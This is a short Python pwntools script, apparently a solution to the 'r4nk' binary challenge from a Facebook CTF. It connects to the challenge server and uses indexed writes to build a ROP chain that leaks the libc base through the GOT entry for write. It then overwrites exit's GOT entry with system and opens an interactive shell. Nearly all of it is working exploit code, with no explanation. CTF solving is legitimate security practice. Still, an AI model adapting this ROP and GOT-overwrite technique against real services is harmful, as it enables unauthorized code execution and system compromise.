from pwn import *

libc = ELF("./libc-2.27.so")
e = ELF("./r4nk")
#p = process(e.path)
p = remote("challenges.fbctf.com", 1339)

idx = 17
def write(val):
  global idx

  p.sendlineafter(">", "2")
  p.sendlineafter(">", str(idx))
  p.sendlineafter(">", str(val))

  idx += 1

write(0x400b43)
write(0x602080)
write(0x4008d0)

write(0x400b43)
write(0x602078)
write(0x4008d0)

write(0x400990)

p.sendlineafter(">", "3")

p.sendlineafter(">", "0")
p.sendlineafter(">", str(e.got["write"]))

p.sendlineafter(">", "0")
p.sendlineafter(">", str(u64("sh".ljust(8, "\x00"))))

p.sendlineafter(">", "1")
p.recvuntil("0. ")
libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["write"]
print("Libc Base: {:#x}".format(libc_base))

idx = 17
write(0x400b43)
write(e.got["exit"])
write(0x4008d0)

write(0x400b43)
write(e.got["exit"] + 4)
write(0x4008d0)

write(0x400b43)
write(0x602078)
write(e.symbols["exit"])

win = p64(libc_base + libc.symbols["system"])

p.sendlineafter(">", "3")

p.sendlineafter(">", "0")
p.sendlineafter(">", str(u64(win[:4].ljust(8, "\x00"))))

p.sendlineafter(">", "0")
p.sendlineafter(">", str(u64(win[4:].ljust(8, "\x00"))))


p.interactive()
